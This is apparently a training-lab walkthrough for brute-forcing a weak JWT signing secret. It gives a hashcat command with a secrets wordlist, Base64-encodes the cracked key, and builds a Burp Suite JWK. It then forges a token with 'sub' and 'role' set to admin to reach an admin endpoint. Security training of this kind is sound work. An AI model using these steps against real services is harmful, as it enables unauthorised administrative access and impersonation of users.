Attack Instructions — Brute-Force Weak Secret Key

The server uses an extremely weak secret to sign JWTs. You can crack it using hashcat with a common secrets wordlist, then forge any token you want.

1 Copy your JWT token
Copy the JWT shown above. You'll need it for the hashcat command.
2 Brute-force the secret with hashcat
Run the following command to crack the JWT signing key: 
hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list

If successful, this will reveal the weak secret key. If you run it again, add --show.

3 Base64-encode the cracked secret
Using Burp Decoder or the command line, Base64-encode the secret: 
# Example: if the secret is "secret1"
echo -n 'secret1' | base64
# Output: c2VjcmV0MQ==
4 Create a signing key in Burp Suite
  1. Go to the JWT Editor Keys tab → click New Symmetric Key
  2. Click Generate to create a new key in JWK format
  3. Replace the k property value with the Base64-encoded secret
  4. Click OK to save
// JWK format with the cracked secret:
{
    "kty": "oct",
    "kid": "...",
    "k": "c2VjcmV0MQ=="   ← Base64 of the cracked secret
}
5 Forge and sign a modified JWT
  1. In Burp Repeater, switch to the JSON Web Token tab
  2. Change "sub" to "admin"
  3. Click Sign → select your key → choose Don't modify header
// Modified payload:
{
  "sub": "admin",
  "role": "admin",
  "iat": 1234567890,
  "exp": 9999999999
}
6 Access the vulnerable admin panel
Send the forged token to access /api/vulnerable-admin (or click the button below) to solve the lab.
